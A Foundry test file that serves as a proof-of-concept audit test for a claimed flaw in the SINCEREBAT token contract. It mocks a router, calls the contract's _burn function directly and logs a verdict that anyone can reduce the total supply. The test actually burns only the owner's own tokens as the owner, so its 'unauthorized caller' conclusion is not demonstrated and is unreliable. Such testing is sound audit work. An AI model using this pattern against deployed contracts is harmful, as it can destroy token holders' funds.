// SPDX-License-Identifier: MIT
pragma solidity 0.8.3;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/SINCEREBAT.sol";

contract SINCEREBAT_BurnTest is Test {
    SINCEREBAT token;
    uint256 initialSupply;
    address owner;

    // Mock contracts to avoid external calls
    address constant ROUTER_ADDRESS = address(0x10ED43C718714eb63d5aA57B78B54704E256024E);

    function setUp() public {
        owner = address(this);

        // Deploy mock contracts
        MockFactory mockFactory = new MockFactory();
        MockRouter mockRouter = new MockRouter(address(mockFactory), address(0x456));

        // Set mock router code at the hardcoded router address
        vm.etch(ROUTER_ADDRESS, address(mockRouter).code);

        // Setup storage slots for the router
        vm.store(
            ROUTER_ADDRESS,
            bytes32(uint256(0)),
            bytes32(uint256(uint160(address(mockFactory))))
        );
        vm.store(
            ROUTER_ADDRESS,
            bytes32(uint256(1)),
            bytes32(uint256(uint160(address(0x456))))
        );

        // Deploy actual token after setting up mocks
        token = new SINCEREBAT();
        initialSupply = token.totalSupply();
    }

    function testOwnerCanBurnTokens() public {
        uint256 burnAmount = 1000 * 10 ** token.decimals();

        // ---------------------------------------------------------------
        // (i) BEFORE-Trigger: capture the state snapshot
        // ---------------------------------------------------------------
        console.log("==================================================");
        console.log("(i) BEFORE-Trigger Action + State Snapshot");
        console.log("==================================================");
        uint256 supplyBefore = token.totalSupply();
        console.log("Action before trigger : totalSupply() query");
        console.log("Total supply before   :", supplyBefore);
        console.log("Planned burn amount    :", burnAmount);

        // ---------------------------------------------------------------
        // (ii) TRIGGER: the critical attacker action
        // ---------------------------------------------------------------
        console.log("==================================================");
        console.log("(ii) TRIGGER: token._burn(owner, burnAmount)");
        console.log("==================================================");
        token._burn(owner, burnAmount);
        console.log("_burn executed by msg.sender:", msg.sender);
        console.log("_burn target address (owner):", owner);

        // ---------------------------------------------------------------
        // (iii) AFTER-Trigger: capture the state snapshot again
        // ---------------------------------------------------------------
        console.log("==================================================");
        console.log("(iii) AFTER-Trigger Action + State Snapshot");
        console.log("==================================================");
        uint256 supplyAfter = token.totalSupply();
        console.log("Action after trigger  : totalSupply() query");
        console.log("Total supply after    :", supplyAfter);

        // Keep the original assertion as an independent verification
        assertEq(
            supplyAfter,
            initialSupply - burnAmount,
            "Total supply should decrease after burn"
        );

        uint256 supplyDelta = supplyBefore - supplyAfter;
        console.log("Observed supply delta :", supplyDelta);

        // ---------------------------------------------------------------
        // (iv) COMPARISON VERDICT
        // ---------------------------------------------------------------
        console.log("==================================================");
        console.log("(iv) COMPARISON VERDICT");
        console.log("==================================================");
        bool stateChanged = supplyAfter < supplyBefore;
        bool exactAmount = (supplyDelta == burnAmount);

        if (stateChanged && exactAmount) {
            console.log("State changed : YES (total supply decreased by exactly burnAmount)");
            console.log("Vulnerability Exists: _burn() is publicly callable, so anyone can arbitrarily reduce total supply");
        } else if (stateChanged) {
            console.log("State changed : YES (total supply decreased)");
            console.log("Vulnerability Exists: _burn() is publicly callable, unauthorized caller reduced total supply");
        } else {
            console.log("State changed : NO (total supply unchanged)");
            console.log("Vulnerability not Exist: total supply was not modified by the burn call");
        }
    }
}

contract MockFactory {
    function createPair(address, address) external pure returns (address) {
        return address(0x789);
    }
}

contract MockRouter {
    address public factory;
    address public WETH;

    constructor(address _factory, address _weth) {
        factory = _factory;
        WETH = _weth;
    }
}